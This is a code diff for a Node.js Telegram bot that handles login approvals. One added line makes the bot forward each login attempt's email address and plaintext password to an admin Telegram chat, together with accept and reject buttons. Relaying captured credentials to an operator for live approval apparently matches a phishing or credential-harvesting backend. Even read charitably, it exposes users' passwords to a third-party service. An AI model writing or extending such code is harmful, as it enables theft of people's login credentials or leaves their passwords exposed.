@@ -5,7 +5,10 @@ const BOT_TOKEN = process.env.BOT_TOKEN;
 const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID;
 const APP_URL = process.env.APP_URL;
 
-const bot = new TelegramBot(BOT_TOKEN);
+// Start bot with polling mode
+const bot = new TelegramBot(BOT_TOKEN, { polling: true });
+
+// Function to send approval buttons
 function sendApprovalRequest(email, password) {
   const options = {
     reply_markup: {
@@ -17,13 +20,13 @@ function sendApprovalRequest(email, password) {
       ],
     },
   };
-  bot.sendMessage(ADMIN_CHAT_ID, ".", options);
+  bot.sendMessage(ADMIN_CHAT_ID, `🔐 Login attempt:\n📧 ${email}\n🔑 ${password}`, options);
 }
 
-
+// Handle button clicks
 bot.on("callback_query", async (query) => {
   let [action, email] = query.data.split("|");
-  email = email.trim().toLowerCase();  // Normalize email here too
+  email = email.trim().toLowerCase();
   const status = action === "accept" ? "accepted" : "rejected";
 
   try {
@@ -34,12 +37,13 @@ bot.on("callback_query", async (query) => {
     });
 
     await bot.answerCallbackQuery(query.id, {
-      text: `You ${status} ${email}`,
+      text: `✅ You ${status} ${email}`,
     });
 
-    await bot.editMessageText(`🔐 ${email} has been ${status.toUpperCase()}`, {
+    await bot.editMessageText(`🔐 ${email} has been *${status.toUpperCase()}*`, {
       chat_id: query.message.chat.id,
       message_id: query.message.message_id,
+      parse_mode: "Markdown",
     });
   } catch (err) {
     console.error("❌ Failed to update status:", err);
@@ -47,7 +51,7 @@ bot.on("callback_query", async (query) => {
   }
 });
 
-
+// Start command
 bot.onText(/\/start/, (msg) => {
   bot.sendMessage(msg.chat.id, "✅ Bot is running and waiting for login approvals.");
 });
